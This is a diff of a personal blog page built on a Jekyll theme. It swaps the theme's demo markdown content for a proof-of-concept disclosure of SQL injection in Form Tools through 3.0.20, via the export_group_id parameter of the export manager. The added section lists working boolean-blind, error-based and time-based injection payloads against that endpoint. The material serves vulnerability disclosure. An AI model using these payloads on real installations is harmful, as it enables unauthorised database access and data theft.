@@ -98,10 +98,10 @@
         
         {
           "author": "Bernardo Rodrigues",
-          "authorURL": "https://en.wikipedia.org/wiki/Albert_Einstein",
-          "affiliations": [
+          "authorURL": "https://www.linkedin.com/in/bernardofsrodrigues/",
+          "country": [
             {
-              "name": "IAS, Princeton",
+              "name": "Portugal",
               "url": ""
             }
           ]
@@ -267,240 +267,51 @@
 
 <p>An issue was discovered in Form Tools through 3.0.20. SQL Injection can occur via the <b>export_group_id</b> field when a low-privileged user (client) try to export a form with data, e.g., manipulation of <code class="language-plaintext highlighter-rouge">modules/export_manager/export.php?export_group_id=1&export_group_1_results=all&export_type_id=1</code></p>
 
+<br>
 
 <p>Create data table export using a normal user account by clicking <i>display:</i></p>
-
 <figure>
   <p><img src="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/SQLI1.png?raw=true" alt="" style="width:100%"> </p>
   <figcaption><a href="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/SQLI1.png?raw=true" target="_blank">Full quality image</a></figcaption>
   </figure>
 
-<hr />
+<br>
 
-<h2 id="code-blocks">Code Blocks</h2>
+<p>Insertion of the special character <b>'</b> to test for possible break in the query and cause database errors:</p>
+<figure>
+  <p><img src="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/SQLI2.png?raw=true" alt="" style="width:100%"> </p>
+  <figcaption><a href="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/SQLI2.png?raw=true" target="_blank">Full quality image</a></figcaption>
+  </figure>
 
-<p>Syntax highlighting is provided within <code class="language-plaintext highlighter-rouge">&lt;d-code&gt;</code> tags.
-An example of inline code snippets: <code class="language-plaintext highlighter-rouge">&lt;d-code language="html"&gt;let x = 10;&lt;/d-code&gt;</code>.
-For larger blocks of code, add a <code class="language-plaintext highlighter-rouge">block</code> attribute:</p>
 
-<d-code block="" language="javascript">
-  var x = 25;
-  function(x) {
-    return x * x;
-  }
-</d-code>
+<p>The endpoint is vulnerable to the following types of SQL Injection attacks:</p>
 
-<p><strong>Note:</strong> <code class="language-plaintext highlighter-rouge">&lt;d-code&gt;</code> blocks do not look well in the dark mode.
-You can always use the default code-highlight using the <code class="language-plaintext highlighter-rouge">highlight</code> liquid tag:</p>
 
-<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="mi">25</span><span class="p">;</span>
-<span class="kd">function</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
-  <span class="k">return</span> <span class="nx">x</span> <span class="o">*</span> <span class="nx">x</span><span class="p">;</span>
-<span class="p">}</span></code></pre></figure>
+<pre><code>&gt; Parameter: export_group_id (GET)
+     
+     Type: boolean-based blind
+     Title: AND boolean-based blind - WHERE or HAVING clause
+     Payload: export_group_id=1 AND 5636=5636&amp;export_group_1_results=all&amp;export_type_id=1
 
-<hr />
+     Type: error-based
+     Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+     Payload: export_group_id=1 AND (SELECT 4229 FROM(SELECT COUNT(*),CONCAT(0x717a627171,(SELECT (ELT(4229=4229,1))
+     ),0x716b787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&amp;export_group_1_results=all&amp;
+     export_type_id=1
 
-<h2 id="layouts">Layouts</h2>
+     Type: time-based blind
+     Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+     Payload: export_group_id=1 AND (SELECT 1946 FROM (SELECT(SLEEP(5)))nmeR)&amp;export_group_1_results=all&amp;
+     export_type_id=1</code></pre>
 
-<p>The main text column is referred to as the body.
-It is the assumed layout of any direct descendants of the <code class="language-plaintext highlighter-rouge">d-article</code> element.</p>
+</code>
 
-<div class="fake-img l-body">
-  <p>.l-body</p>
-</div>
 
-<p>For images you want to display a little larger, try <code class="language-plaintext highlighter-rouge">.l-page</code>:</p>
 
-<div class="fake-img l-page">
-  <p>.l-page</p>
-</div>
 
-<p>All of these have an outset variant if you want to poke out from the body text a little bit.
-For instance:</p>
 
-<div class="fake-img l-body-outset">
-  <p>.l-body-outset</p>
-</div>
 
-<div class="fake-img l-page-outset">
-  <p>.l-page-outset</p>
-</div>
-
-<p>Occasionally you’ll want to use the full browser width.
-For this, use <code class="language-plaintext highlighter-rouge">.l-screen</code>.
-You can also inset the element a little from the edge of the browser by using the inset variant.</p>
-
-<div class="fake-img l-screen">
-  <p>.l-screen</p>
-</div>
-<div class="fake-img l-screen-inset">
-  <p>.l-screen-inset</p>
-</div>
-
-<p>The final layout is for marginalia, asides, and footnotes.
-It does not interrupt the normal flow of <code class="language-plaintext highlighter-rouge">.l-body</code> sized text except on mobile screen sizes.</p>
-
-<div class="fake-img l-gutter">
-  <p>.l-gutter</p>
-</div>
-
-<p>Emphasis, aka italics, with <em>asterisks</em> or <em>underscores</em>.</p>
-
-<p>Strong emphasis, aka bold, with <strong>asterisks</strong> or <strong>underscores</strong>.</p>
-
-<p>Combined emphasis with <strong>asterisks and <em>underscores</em></strong>.</p>
-
-<p>Strikethrough uses two tildes. <del>Scratch this.</del></p>
-
-<ol>
-  <li>First ordered list item</li>
-  <li>Another item
-⋅⋅* Unordered sub-list.</li>
-  <li>Actual numbers don’t matter, just that it’s a number
-⋅⋅1. Ordered sub-list</li>
-  <li>And another item.</li>
-</ol>
-
-<p>⋅⋅⋅You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we’ll use three here to also align the raw Markdown).</p>
-
-<p>⋅⋅⋅To have a line break without a paragraph, you will need to use two trailing spaces.⋅⋅
-⋅⋅⋅Note that this line is separate, but within the same paragraph.⋅⋅
-⋅⋅⋅(This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)</p>
-
-<ul>
-  <li>Unordered list can use asterisks</li>
-  <li>Or minuses</li>
-  <li>Or pluses</li>
-</ul>
-
-<p><a href="https://www.google.com">I’m an inline-style link</a></p>
-
-<p><a href="https://www.google.com" title="Google's Homepage">I’m an inline-style link with title</a></p>
-
-<p><a href="https://www.mozilla.org">I’m a reference-style link</a></p>
-
-<p><a href="../blob/master/LICENSE">I’m a relative reference to a repository file</a></p>
-
-<p><a href="http://slashdot.org">You can use numbers for reference-style link definitions</a></p>
-
-<p>Or leave it empty and use the <a href="http://www.reddit.com">link text itself</a>.</p>
-
-<p>URLs and URLs in angle brackets will automatically get turned into links. 
-http://www.example.com or <a href="http://www.example.com">http://www.example.com</a> and sometimes 
-example.com (but not on Github, for example).</p>
-
-<p>Some text to show that the reference links can follow later.</p>
-
-<p>Here’s our logo (hover to see the title text):</p>
-
-<p>Inline-style: 
-<img src="https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png" alt="alt text" title="Logo Title Text 1" /></p>
-
-<p>Reference-style: 
-<img src="https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png" alt="alt text" title="Logo Title Text 2" /></p>
-
-<p>Inline <code class="language-plaintext highlighter-rouge">code</code> has <code class="language-plaintext highlighter-rouge">back-ticks around</code> it.</p>
-
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">JavaScript syntax highlighting</span><span class="dl">"</span><span class="p">;</span>
-<span class="nx">alert</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
-</code></pre></div></div>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="s">"Python syntax highlighting"</span>
-<span class="k">print</span> <span class="n">s</span>
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>No language indicated, so no syntax highlighting. 
-But let's throw in a &lt;b&gt;tag&lt;/b&gt;.
-</code></pre></div></div>
-
-<p>Colons can be used to align columns.</p>
-
-<table>
-  <thead>
-    <tr>
-      <th>Tables</th>
-      <th style="text-align: center">Are</th>
-      <th style="text-align: right">Cool</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>col 3 is</td>
-      <td style="text-align: center">right-aligned</td>
-      <td style="text-align: right">$1600</td>
-    </tr>
-    <tr>
-      <td>col 2 is</td>
-      <td style="text-align: center">centered</td>
-      <td style="text-align: right">$12</td>
-    </tr>
-    <tr>
-      <td>zebra stripes</td>
-      <td style="text-align: center">are neat</td>
-      <td style="text-align: right">$1</td>
-    </tr>
-  </tbody>
-</table>
-
-<p>There must be at least 3 dashes separating each header cell.
-The outer pipes (|) are optional, and you don’t need to make the 
-raw Markdown line up prettily. You can also use inline Markdown.</p>
-
-<table>
-  <thead>
-    <tr>
-      <th>Markdown</th>
-      <th>Less</th>
-      <th>Pretty</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><em>Still</em></td>
-      <td><code class="language-plaintext highlighter-rouge">renders</code></td>
-      <td><strong>nicely</strong></td>
-    </tr>
-    <tr>
-      <td>1</td>
-      <td>2</td>
-      <td>3</td>
-    </tr>
-  </tbody>
-</table>
-
-<blockquote>
-  <p>Blockquotes are very handy in email to emulate reply text.
-This line is part of the same quote.</p>
-</blockquote>
-
-<p>Quote break.</p>
-
-<blockquote>
-  <p>This is a very long line that will still be quoted properly when it wraps. Oh boy let’s keep writing to make sure this is long enough to actually wrap for everyone. Oh, you can <em>put</em> <strong>Markdown</strong> into a blockquote.</p>
-</blockquote>
-
-<p>Three or more…</p>
-
-<hr />
-
-<p>Hyphens</p>
-
-<hr />
-
-<p>Asterisks</p>
-
-<hr />
-
-<p>Underscores</p>
-
-<p>Here’s a line for us to start with.</p>
-
-<p>This line is separated from the one above by two newlines, so it will be a <em>separate paragraph</em>.</p>
-
-<p>This line is also a separate paragraph, but…
-This line is only separated by a single newline, so it’s a separate line in the <em>same paragraph</em>.</p>
-
-      </d-article>
+</d-article>
 
       <d-appendix>
         <d-footnote-list></d-footnote-list>
@@ -514,11 +325,7 @@ This line is only separated by a single newline, so it’s a separate line in th
     
 <footer class="fixed-bottom">
   <div class="container mt-0">
-    &copy; Copyright 2021 Bernardo  Rodrigues.
-    Powered by <a href="http://jekyllrb.com/" target="_blank">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank">Unsplash</a>.
-
-    
-    
+    &copy; Copyright 2021 Bernardo  Rodrigues
   </div>
 </footer>
 
